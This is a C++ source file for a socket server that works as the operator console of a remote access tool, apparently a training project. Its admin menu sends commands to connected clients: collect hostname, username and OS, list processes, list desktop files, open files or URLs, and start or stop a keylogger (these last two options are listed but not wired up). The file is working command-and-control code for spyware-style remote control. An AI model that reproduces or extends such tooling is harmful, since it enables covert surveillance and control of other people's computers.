#include "LPTF_Server.h"

LPTF_Server::LPTF_Server(const string &ip, int port) : clientSocket(INVALID_SOCKET)
{
    if (!serverSocket.create())
    {
        throw runtime_error("Failed to create server socket");
    }
    if (!serverSocket.bind(port))
    {
        throw runtime_error("Bind failed");
    }
    if (!serverSocket.listen())
    {
        throw runtime_error("Listen failed");
    }

    cout << "Server running and waiting" << endl;
    cout << "Ip : " << ip << " | Port : " << port << endl;
    handleConnection();
}

LPTF_Server::~LPTF_Server()
{
}

void LPTF_Server::handleClient(LPTF_Socket &clientSocket)
{
    uint8_t header[2];
    if (!clientSocket.receivePacket(header, 2))
    {
        cerr << "Error receiving packet header." << endl;
        return;
    }

    uint16_t packetSize = (header[0] << 8) | header[1];
    if (packetSize < 3)
    {
        cerr << "Invalid packet size." << endl;
        return;
    }

    vector<uint8_t> data(packetSize);
    data[0] = header[0];
    data[1] = header[1];

    if (!clientSocket.receivePacket(data.data() + 2, packetSize - 2))
    {
        cerr << "Error receiving full packet." << endl;
        return;
    }

    try
    {
        LPTF_Packet packet = LPTF_Packet::deserialize(data);
        handleCommand(packet);
    }
    catch (const exception &e)
    {
        cerr << "Packet error: " << e.what() << endl;
    }
}

void LPTF_Server::sendPacketToClient(LPTF_Socket &clientSocket, const std::string &data, CommandType type)
{
    if (data.empty())
    {
        cerr << "Empty data, not sending response." << endl;
        return;
    }

    cout << "[SERVER] Sending data to client " << clientSocket.get_fd() << ": " << data << endl;

    {
        vector<uint8_t> payload(data.begin(), data.end());
        LPTF_Packet response(static_cast<uint8_t>(type), payload);
        auto serialized = response.serialize();

        if (!clientSocket.sendAll(serialized.data(), serialized.size()))
        {
            cerr << "Error sending data to client." << endl;
        }
    }
}

void LPTF_Server::handleConnection()
{
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(serverSocket.get_fd(), &readfds);

    timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 0;

    int result = select(0, &readfds, nullptr, nullptr, &timeout);
    if (result > 0 && FD_ISSET(serverSocket.get_fd(), &readfds))
    {
        cout << "Accepting new connection..." << endl;
        SOCKET newSock = serverSocket.accept();
        if (newSock != INVALID_SOCKET)
        {
            auto *newClient = new LPTF_Socket();
            newClient->setSocket(newSock);
            clientSockets.push_back(newClient);
            cout << "[SERVER] Client connected! Total clients: " << clientSockets.size() << "\n";
        }
    }
}

void LPTF_Server::run()
{
    while (true)
    {
        handleConnection();
        handleAdminInput();
        if (clientSockets.empty())
        {
            this_thread::sleep_for(chrono::milliseconds(50));
            continue;
        }

        fd_set readfds;
        FD_ZERO(&readfds);
        SOCKET max_fd = 0;
        for (auto *client : clientSockets)
        {
            FD_SET(client->get_fd(), &readfds);
            if (client->get_fd() > max_fd)
                max_fd = client->get_fd();
        }

        timeval timeout{};
        timeout.tv_sec = 0;
        timeout.tv_usec = 0;

        int activity = select(0, &readfds, nullptr, nullptr, &timeout);

        if (activity < 0)
        {
            cerr << "[SERVER ERROR] select() failed.\n";
            continue;
        }

        for (auto it = clientSockets.begin(); it != clientSockets.end();)
        {
            LPTF_Socket *client = *it;

            if (FD_ISSET(client->get_fd(), &readfds))
            {
                uint8_t header[2];
                int result = recv(client->get_fd(), reinterpret_cast<char *>(header), 2, MSG_PEEK);

                if (result > 0)
                {
                    handleClient(*client);
                    ++it;
                }
                else if (result == 0 || (result == -1 && WSAGetLastError() == WSAECONNRESET))
                {
                    client->close();
                    delete client;
                    it = clientSockets.erase(it);
                    cout << "[SERVER] Client " << client->get_fd() << " disconnected. Total: " << clientSockets.size() << "\n";
                }
                else
                {
                    ++it;
                }
            }
            else
            {
                ++it;
            }
        }

        this_thread::sleep_for(chrono::milliseconds(50));
    }
}

void LPTF_Server::handleAdminInput()
{
    if (_kbhit())
    {
        int input;
        cout << "\n===== MENU =====\n"
             << "1. list - List connected clients\n"
             << "2. send - Send a message to a client\n"
             << "3. Return system information (hostname, username, OS)\n"
             << "4. List running processes\n"
             << "5. Execute a system command \n"
             << "6. Start keylogger\n"
             << "7. Stop keylogger\n"
             << "8. quit - Quit the server \n\n"
             << ">> Choose an option: ";
        cin >> input;
        if (cin.fail())
        {
            cin.clear();
            cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            cout << "[SERVER MENU] Invalid input. Please enter a number.\n";
            return;
        }

        for (auto *client : clientSockets)
        {
            switch (input)
            {
            case 1:
            {
                cout << "Connected clients:\n";
                cout << "- fd: " << client->get_fd() << "\n";
                break;
            }
            case 2:
            {
                cout << "Enter message to send: ";
                string msg;
                getline(cin, msg);
                LPTF_Packet packet(0x01, vector<uint8_t>(msg.begin(), msg.end()));
                auto serialized = packet.serialize();
                client->sendAll(serialized.data(), serialized.size());
                break;
            }
            case 3:
            {
                sendPacketToClient(*client, "> Requesting host info", CommandType::HOST_INFO_REQUEST);
                break;
            }
            case 4:
            {
                sendPacketToClient(*client, "> Requesting process list", CommandType::LIST_PROCESSES_REQUEST);
                break;
            }
            case 5:
            {
                cout << "Command to execute\n"
                     << "1 - list_desktop_files\n"
                     << "2 - create_test_file\n"
                     << "3 - open file\n"
                     << "4 - open URL\n"
                     << "Enter command to execute: ";
                int command;
                cin.ignore();
                cin >> command;
                if (cin.fail())
                {
                    cin.clear();
                    cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                    cout << "[SERVER MENU] Invalid input. Please enter a number.\n";
                    return;
                }
                switch (command)
                {
                case 1:
                {
                    sendPacketToClient(*client, "list_desktop_files", CommandType::EXECUTE_COMMAND_REQUEST);
                    break;
                }
                case 2:
                {
                    sendPacketToClient(*client, "create_test_file", CommandType::EXECUTE_COMMAND_REQUEST);
                    break;
                }
                case 3:
                {
                    cout << "Enter the file name to open: ";
                    string fileName;
                    cin.ignore();
                    getline(cin, fileName);

                    string payload = "opendesktop_file " + fileName;
                    sendPacketToClient(*client, payload, CommandType::EXECUTE_COMMAND_REQUEST);
                    break;
                }
                case 4:
                {
                    cout << "Enter the url: ";
                    string url;
                    cin.ignore();
                    getline(cin, url);

                    string payload = "open_url " + url;
                    sendPacketToClient(*client, payload, CommandType::EXECUTE_COMMAND_REQUEST);
                    break;
                }
                default:
                {
                    cout << "[SERVER MENU] Unknown command.\n";
                    break;
                }
                }
                break;
            }
            case 8:
            {
                cout << "Shutting down server...\n";
                exit(0);
                break;
            }
            default:
            {
                cout << "[SERVER MENU] Unknown command.\n";
                break;
            }
            }
        }
    }
}

void LPTF_Server::handleCommand(const LPTF_Packet &packet)
{
    string data(packet.getPayload().begin(), packet.getPayload().end());
    CommandType type = static_cast<CommandType>(packet.getType());

    for (auto *client : clientSockets)
    {

        switch (type)
        {
        case CommandType::HOST_INFO_RESPONSE:
        {
            cout << data << endl;
            break;
        }

        case CommandType::KEY_LOG_DATA_RESPONSE:
        {
            cout << "[Client] : Starting keylogger..." << endl;
            break;
        }

        case CommandType::LIST_PROCESSES_RESPONSE:
        {
            vector<vector<string>> processes = deserializeStringTable(packet.getPayload());
            cout << "[Client] : List of processes received:\n";
            for (const auto &process : processes)
            {
                cout << "Process: " << left << setw(20) << process[0].substr(0, 18)
                     << " PID: " << setw(6) << process[1]
                     << " | PPID: " << setw(6) << process[2]
                     << " | Threads: " << setw(4) << process[3]
                     << " | Priority: " << setw(3) << process[4]
                     << " | Runtime: " << process[5] << endl;
            }
            break;
        }
        case CommandType::COMMAND_RESULT_RESPONSE:
        {
            cout << data << endl;
            break;
        }

        case CommandType::SEND_MESSAGE:
        {
            sendPacketToClient(*client, data, CommandType::SEND_MESSAGE);
            break;
        }
        default:
        {
            cerr << "[Client] : Unknown command type received: " << static_cast<int>(packet.getType()) << endl;
            break;
        }
        }
    }
}

vector<vector<string>> LPTF_Server::deserializeStringTable(const vector<uint8_t> &payload)
{
    vector<vector<string>> result;
    size_t offset = 0;

    auto read_uint32 = [&](uint32_t &value)
    {
        if (offset + sizeof(uint32_t) > payload.size())
            throw std::runtime_error("Invalid payload");
        value = *reinterpret_cast<const uint32_t *>(&payload[offset]);
        offset += sizeof(uint32_t);
    };

    uint32_t rowCount;
    read_uint32(rowCount);

    for (uint32_t i = 0; i < rowCount; ++i)
    {
        uint32_t colCount;
        read_uint32(colCount);

        vector<string> row;
        for (uint32_t j = 0; j < colCount; ++j)
        {
            uint32_t strLen;
            read_uint32(strLen);

            if (offset + strLen > payload.size())
                throw std::runtime_error("Invalid payload");

            string cell(payload.begin() + offset, payload.begin() + offset + strLen);
            offset += strLen;

            row.push_back(cell);
        }
        result.push_back(row);
    }

    return result;
}
